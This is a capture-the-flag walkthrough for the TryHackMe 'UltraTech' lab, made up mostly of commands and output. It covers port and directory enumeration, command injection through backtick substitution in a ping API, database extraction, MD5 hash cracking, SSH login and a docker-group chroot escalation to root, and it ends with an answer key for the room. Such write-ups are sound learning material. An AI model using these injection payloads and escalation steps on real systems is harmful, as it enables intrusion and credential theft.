# UltraTech | TryHackMe Walkthrough

**Room:** UltraTech  
**Difficulty:** Medium  
**Tags:** Enumeration, SQL Injection, Command Injection, Privilege Escalation  

---

## 🔍 1. Reconnaissance

Scan all ports:

```bash
nmap -sC -sV -Pn -p- -oN nmap_ultratech.txt 10.10.10.10
```

**Results:**
- 21/tcp → vsftpd  
- 22/tcp → OpenSSH  
- 8081/tcp → Node.js Express  
- 31331/tcp → Apache HTTPD (Ubuntu)  

---

## 🌐 2. Web Enumeration

### Port 8081 (Node.js Express API)

```bash
gobuster dir -u http://10.10.10.10:8081 -w /usr/share/wordlists/dirb/common.txt
```

**Found:**  
```
/auth
/ping
```

### Port 31331 (Apache)

```bash
gobuster dir -u http://10.10.10.10:31331 -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
```
/js
```

Inside `/js`, there is `api.js` which points to `/ping?ip=`.

---

## 💉 3. Exploiting the API (Command Injection)

Test the API:

```bash
curl "http://10.10.10.10:8081/ping?ip=127.0.0.1"
```

It works.  
Try injection:

```bash
curl "http://10.10.10.10:8081/ping?ip=127.0.0.1;ls"
```

Not working (filtered).  
But command substitution works:

```bash
curl "http://10.10.10.10:8081/ping?ip=127.0.0.1`ls`"
```

**Result:** found file `utech.db.sqlite`.

---

## 📂 4. Extracting the Database

Read contents:

```bash
curl "http://10.10.10.10:8081/ping?ip=127.0.0.1`cat utech.db.sqlite`"
```

The SQLite database contains usernames and hashes.

---

## 🔑 5. Users and Hashes

Extracted hashes:

```
r00t : f357a0c52799563c7c7b76c1e7543a32
admin: 0d0ea5111e3c1def594c1684e3b9be84
```

Crack with hashcat:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:**  
```
r00t : cyberpunk
```

---

## 🖥 6. SSH Access

```bash
ssh r00t@10.10.10.10
```

Password: `cyberpunk`

---

## 🔼 7. Privilege Check

```bash
id
```

**Output:**
```
uid=1000(r00t) gid=1000(r00t) groups=1000(r00t),999(docker)
```

The user belongs to the **docker** group.

---

## 🚀 8. Privilege Escalation via Docker

Run container mounting host:

```bash
docker run -it -v /:/mnt bash
```

Change root:

```bash
chroot /mnt
```

Now we are root 🎉

---

## 📜 9. Summary (Answers)

1. Port 8081 → Node.js Express  
2. Non-standard port → 31331  
3. Running on 31331 → Apache  
4. Distro → Ubuntu  
5. Number of API routes → 2  
6. Database file → `utech.db.sqlite`  
7. MD5 hash of r00t → `f357a0c52799563c7c7b76c1e7543a32`  
8. Exploitation method → command substitution (`` `...` ``)  
9. Privilege escalation → docker group → root  
